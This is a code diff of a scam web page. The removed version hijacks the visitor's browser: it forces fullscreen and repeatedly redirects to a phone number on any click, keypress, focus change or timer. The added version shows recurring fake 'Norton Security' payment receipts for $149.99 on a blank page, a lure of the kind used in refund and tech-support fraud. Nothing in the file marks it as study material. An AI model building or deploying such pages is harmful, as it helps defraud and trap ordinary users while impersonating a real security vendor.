@@ -1,193 +1,361 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Call Service</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Norton Receipt</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
+        
         body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #ff0000, #0000ff);
-            color: white;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
+            background-color: #000;
+            min-height: 100vh;
             overflow: hidden;
-            touch-action: none;
         }
-        #clickOverlay {
+        
+        .notification-container {
             position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            width: 380px;
+        }
+        
+        .notification {
+            background: linear-gradient(145deg, #ffffff, #f8f9fa);
+            color: #2c3e50;
+            border-radius: 15px;
+            padding: 0;
+            box-shadow: 0 10px 35px rgba(255, 83, 0, 0.25);
+            overflow: hidden;
+            cursor: pointer;
+            border-left: 6px solid #ff5500;
+            transform: translateX(450px);
+            opacity: 0;
+            transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.6s;
+            position: relative;
+        }
+        
+        .notification::before {
+            content: "";
+            position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #ff8c00, #ff5500);
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+            opacity: 1;
+        }
+        
+        .notification:hover {
+            transform: translateX(-5px);
+            box-shadow: 0 15px 40px rgba(255, 83, 0, 0.35);
+        }
+        
+        .notification-header {
+            background: linear-gradient(135deg, #ff8c00, #ff5500);
+            color: white;
+            padding: 20px 25px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            z-index: 10000;
+            gap: 15px;
+        }
+        
+        .notification-icon {
+            width: 45px;
+            height: 45px;
+            background: rgba(255, 255, 255, 0.25);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 22px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.15);
+        }
+        
+        .notification-title {
+            font-weight: 800;
+            font-size: 22px;
+            flex: 1;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        
+        .notification-close {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            font-size: 24px;
             cursor: pointer;
+            width: 35px;
+            height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: all 0.3s;
         }
-        .overlay-content {
-            background: white;
-            color: black;
-            padding: 30px;
-            border-radius: 10px;
+        
+        .notification-close:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: scale(1.1);
+        }
+        
+        .notification-body {
+            padding: 25px;
+            text-align: left;
+        }
+        
+        .receipt-header {
             text-align: center;
-        }
-        .content {
-            padding: 20px;
-        }
-        h1 {
-            font-size: 2.5rem;
             margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            padding-bottom: 15px;
+            border-bottom: 2px dashed #e0e0e0;
         }
-        .blink {
-            animation: blink 1s infinite;
-            font-size: 1.5rem;
-            margin: 20px 0;
+        
+        .receipt-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ff5500;
+            margin-bottom: 5px;
         }
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
+        
+        .receipt-subtitle {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .receipt-details {
+            margin-bottom: 20px;
+        }
+        
+        .receipt-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .receipt-label {
+            font-weight: 600;
+            color: #555;
+        }
+        
+        .receipt-value {
+            font-weight: 700;
+            color: #2c3e50;
+        }
+        
+        .amount-highlight {
+            font-size: 28px;
+            color: #ff5500;
+            font-weight: 800;
+        }
+        
+        .thank-you {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 2px dashed #e0e0e0;
+            font-weight: 600;
+            color: #27ae60;
+            font-size: 16px;
+        }
+        
+        .notification-action {
+            color: #ff5500;
+            font-weight: 800;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 15px 0 5px;
+            transition: all 0.3s;
+        }
+        
+        .notification-action::after {
+            content: "➔";
+            font-weight: bold;
+            font-size: 18px;
+            transition: transform 0.3s;
+        }
+        
+        .notification:hover .notification-action::after {
+            transform: translateX(5px);
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        /* Pulse animation for extra attention */
+        @keyframes pulse {
+            0% { box-shadow: 0 10px 35px rgba(255, 83, 0, 0.25); }
+            50% { box-shadow: 0 10px 35px rgba(255, 83, 0, 0.4); }
+            100% { box-shadow: 0 10px 35px rgba(255, 83, 0, 0.25); }
+        }
+        
+        .notification.pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        .receipt-badge {
+            background: #27ae60;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            display: inline-block;
+            margin-left: 10px;
         }
     </style>
 </head>
 <body>
-    <!-- First Click Overlay -->
-    <div id="clickOverlay">
-        <div class="overlay-content">
-            <h2>📞 Tap to Call Support</h2>
-            <p>Click anywhere to connect immediately</p>
-            <button style="padding: 15px 30px; font-size: 18px; margin-top: 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">
-                TAP HERE TO START
-            </button>
-        </div>
-    </div>
-
-    <!-- Main Content -->
-    <div class="content" style="display: none;">
-        <h1>📞 CALLING... 📞</h1>
-        <div class="blink">Please Wait</div>
-        <p>Connecting you to our support team</p>
+    <!-- Completely blank page - only notifications will appear -->
+    
+    <div class="notification-container" id="notification-container">
+        <!-- Notifications will appear here automatically -->
     </div>
 
     <script>
-        const PHONE_NUMBER = "+911234567890";
-        let fullscreenActivated = false;
-        
-        // Fullscreen function
-        function enterFullscreen() {
-            try {
-                const elem = document.documentElement;
-                if (elem.requestFullscreen) {
-                    elem.requestFullscreen().catch(e => console.log(e));
-                } else if (elem.webkitRequestFullscreen) {
-                    elem.webkitRequestFullscreen();
-                } else if (elem.msRequestFullscreen) {
-                    elem.msRequestFullscreen();
-                } else if (elem.mozRequestFullScreen) {
-                    elem.mozRequestFullScreen();
-                }
-                fullscreenActivated = true;
-            } catch (e) {
-                console.log("Fullscreen error:", e);
-            }
-        }
-        
-        // Fast redirect function
-        function fastRedirect() {
-            // Show calling content
-            document.querySelector('.content').style.display = 'block';
+        document.addEventListener('DOMContentLoaded', function() {
+            const notificationContainer = document.getElementById('notification-container');
             
-            // Immediate redirect
-            window.location.href = "tel:" + PHONE_NUMBER;
-            
-            // Multiple fallbacks
-            setTimeout(() => {
-                window.open("tel:" + PHONE_NUMBER, "_self");
-            }, 50);
-            
-            setTimeout(() => {
-                window.location.replace("tel:" + PHONE_NUMBER);
-            }, 100);
-            
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = "tel:" + PHONE_NUMBER;
-                document.body.appendChild(iframe);
-            }, 150);
-        }
-        
-        // First click handler
-        function handleFirstClick() {
-            // Remove overlay
-            document.getElementById('clickOverlay').style.display = 'none';
-            
-            // Enter fullscreen (now allowed because user clicked)
-            enterFullscreen();
-            
-            // Start call process
-            fastRedirect();
-            
-            // Activate all other event listeners
-            activateAllEvents();
-        }
-        
-        // Activate all events after first click
-        function activateAllEvents() {
-            // URL bar click detection
-            let currentURL = window.location.href;
-            
-            setInterval(() => {
-                if(window.location.href !== currentURL) {
-                    currentURL = window.location.href;
-                    fastRedirect();
-                }
+            // Function to create notification
+            function createNortonReceipt() {
+                const notification = document.createElement('div');
+                notification.className = 'notification';
+                notification.innerHTML = `
+                    <div class="notification-header">
+                        <div class="notification-icon">📧</div>
+                        <div class="notification-title">Payment Receipt</div>
+                        <button class="notification-close">&times;</button>
+                    </div>
+                    <div class="notification-body">
+                        <div class="receipt-header">
+                            <div class="receipt-title">Norton Security</div>
+                            <div class="receipt-subtitle">Order Confirmation #NS${Math.floor(100000 + Math.random() * 900000)}</div>
+                        </div>
+                        
+                        <div class="receipt-details">
+                            <div class="receipt-item">
+                                <span class="receipt-label">Amount Paid:</span>
+                                <span class="receipt-value amount-highlight">$149.99</span>
+                            </div>
+                            <div class="receipt-item">
+                                <span class="receipt-label">Plan:</span>
+                                <span class="receipt-value">Norton 360 Deluxe</span>
+                            </div>
+                            <div class="receipt-item">
+                                <span class="receipt-label">Validity:</span>
+                                <span class="receipt-value">2 Years <span class="receipt-badge">BEST VALUE</span></span>
+                            </div>
+                            <div class="receipt-item">
+                                <span class="receipt-label">Devices:</span>
+                                <span class="receipt-value">5 Devices Protected</span>
+                            </div>
+                            <div class="receipt-item">
+                                <span class="receipt-label">Next Billing:</span>
+                                <span class="receipt-value">March 2026</span>
+                            </div>
+                        </div>
+                        
+                        <div class="thank-you">
+                            Thank you for choosing security!
+                        </div>
+                        
+                        <div class="notification-action">
+                            Download Invoice & Setup Instructions
+                        </div>
+                    </div>
+                `;
                 
-                if(document.activeElement.tagName === 'INPUT' || 
-                   document.activeElement.tagName === 'TEXTAREA') {
-                    fastRedirect();
+                notificationContainer.prepend(notification);
+                
+                // Add pulse animation for attention
+                notification.classList.add('pulse');
+                
+                // Show notification with animation
+                setTimeout(() => {
+                    notification.classList.add('show');
+                }, 100);
+                
+                // Auto-remove after 15 seconds
+                const autoRemove = setTimeout(() => {
+                    if (notification.parentNode) {
+                        notification.classList.remove('show');
+                        setTimeout(() => {
+                            if (notification.parentNode) {
+                                notification.remove();
+                            }
+                        }, 600);
+                    }
+                }, 15000);
+                
+                // Close button functionality
+                const closeBtn = notification.querySelector('.notification-close');
+                closeBtn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    clearTimeout(autoRemove);
+                    notification.classList.remove('show', 'pulse');
+                    setTimeout(() => {
+                        notification.remove();
+                    }, 600);
+                });
+                
+                // Click notification to redirect to Norton
+                notification.addEventListener('click', function() {
+                    window.open('https://www.norton.com', '_blank');
+                    notification.classList.remove('show', 'pulse');
+                    setTimeout(() => {
+                        notification.remove();
+                    }, 600);
+                });
+                
+                // Limit to 2 notifications
+                if (notificationContainer.children.length > 2) {
+                    const lastNotification = notificationContainer.lastChild;
+                    if (lastNotification) {
+                        lastNotification.classList.remove('show', 'pulse');
+                        setTimeout(() => {
+                            if (lastNotification.parentNode) {
+                                lastNotification.remove();
+                            }
+                        }, 600);
+                    }
                 }
-            }, 10);
-            
-            // All other events
-            document.addEventListener('click', fastRedirect);
-            document.addEventListener('touchstart', fastRedirect);
-            document.addEventListener('keydown', fastRedirect);
-            
-            window.addEventListener('blur', () => setTimeout(fastRedirect, 100));
-            window.addEventListener('focus', () => setTimeout(fastRedirect, 100));
-            
-            // Continuous call attempts
-            setInterval(fastRedirect, 2000);
-        }
-        
-        // Add first click listener
-        document.getElementById('clickOverlay').addEventListener('click', handleFirstClick);
-        document.addEventListener('touchstart', handleFirstClick, { once: true });
-        
-        // Auto-call after 10 seconds if no interaction
-        setTimeout(() => {
-            if (!fullscreenActivated) {
-                handleFirstClick();
             }
-        }, 10000);
-        
+            
+            // Show first receipt after 2 seconds
+            setTimeout(createNortonReceipt, 2000);
+            
+            // Show additional receipts randomly (every 20-30 seconds)
+            setInterval(createNortonReceipt, 20000 + Math.random() * 10000);
+            
+            // Show receipt when user moves mouse (engagement trigger)
+            let mouseMoveCount = 0;
+            document.addEventListener('mousemove', function() {
+                mouseMoveCount++;
+                if (mouseMoveCount === 5 && notificationContainer.children.length === 0) {
+                    createNortonReceipt();
+                }
+            });
+        });
     </script>
 </body>
 </html>
